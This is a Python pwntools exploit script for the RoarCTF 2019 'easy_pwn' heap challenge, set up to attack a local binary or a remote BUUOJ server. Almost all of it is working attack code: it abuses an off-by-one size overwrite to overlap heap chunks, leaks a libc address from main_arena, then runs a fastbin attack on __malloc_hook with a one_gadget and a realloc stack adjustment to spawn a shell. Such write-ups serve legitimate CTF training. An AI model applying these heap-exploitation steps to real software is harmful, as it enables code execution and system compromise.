# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'roarctf_2019_easy_pwn'
islocal = 1
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 26627)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def add(size):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(str(size))

def edit(index,size,data):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(index))
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('content:')
    p.send(data)

def free(index):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(index))

def show(index):
    p.recvuntil('choice: ')
    p.sendline('4')
    p.recvuntil('index:')
    p.sendline(str(index))   

def leak():
    global libc_base
    add(0x18)       # 0 0x18 = 24
    add(0x18)       # 1
    add(0x88)       # 2
    add(0x88)       # 3

    add(0x28)       # 4 0x28 = 40
    add(0x28)       # 5
    add(0x68)       # 6
    # debug(0)
    edit(0, 34, b'a'*0x18 + p8(0xb1))        #edit chunk_size
    # debug(0)
    free(1)
    # debug(0)
    add(0xa8)       #1
    # debug(0)
    edit(1, 0x20, b'a'*0x18 + p64(0x91))     #set chunk 2 的大小为 small bin
    # debug(0)
    free(2)
    # debug(0)
    show(1)                             #leak main_arena_addr
    p.recvuntil('content: ')
    p.recv(0x20)
    main_arena_addr = u64(p.recv(8))
    libc_base = main_arena_addr - 0x3c4b78
    # display
    log.success('main_arena_addr => ' + hex(main_arena_addr))
    log.success('libc_base => ' + hex(libc_base))

def pwn():
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    libc_realloc = libc_base + libc.sym['__libc_realloc']
    one_gadget = [libc_base + 0xf1147, libc_base + 0x4527a]
    # display
    log.success('__malloc_hook => ' + hex(malloc_hook))
    log.success('__libc_realloc => ' + hex(libc_realloc))
    log.success('one_gadget => ' + hex(one_gadget[1]))

    edit(4, 50, b'a' * 0x28 + p8(0xa1))                 # chunk4_user_data's size = 0x28(40=50-10)
    # debug(0)
    free(5)
    # debug(0)
    free(6)
    # debug(0)
    add(0x98)   # 2
    # debug(0)
    edit(2,0x38, b'b'*0x28 + p64(0x71) + p64(malloc_hook-0x23)) # fastbin attack 任意地址写
    # debug(0)
    add(0x68)   # 5
    # debug(0)
    add(0x68)   # 6
    # debug(0)
    edit(6,27, b'c'*(0x13-8) + p64(one_gadget[1]) + p64(libc_realloc+16)) # 利用 ralloc_hook 改变栈环境达成 one_gadget 的条件
    # debug(0)
    add(0x10)
    # debug(0)
    p.interactive()

if __name__ == '__main__':
    leak()
    pwn()